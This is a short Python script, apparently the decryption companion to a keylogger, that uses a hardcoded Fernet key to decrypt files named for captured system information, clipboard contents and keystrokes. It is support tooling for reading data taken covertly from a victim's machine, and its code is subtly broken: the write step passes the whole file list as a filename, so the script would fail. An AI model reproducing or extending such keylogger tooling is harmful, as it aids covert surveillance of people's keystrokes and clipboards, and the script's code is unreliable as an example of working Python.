from cryptography.fernet import Fernet

key = "P9gaeFq6BpQTobg8UV-eIwCTVSIjd-KcDf_xP1-CMg0="
system_infromation_e = "e_systems.txt"
clipboard_information_e = "e_clipboard.txt"
keys_information_e = "e_keys.txt"

encrypted_files = [system_infromation_e, clipboard_information_e, keys_information_e]

count = 0

for decrypting_files in encrypted_files:
    with open(encrypted_files[count], 'rb') as f:
        data = f.read()

    fernet = Fernet(key)
    decrypted = fernet.decrypt(data)

    with open(encrypted_files, 'wb') as f:
        f.write(decrypted)
    count += 1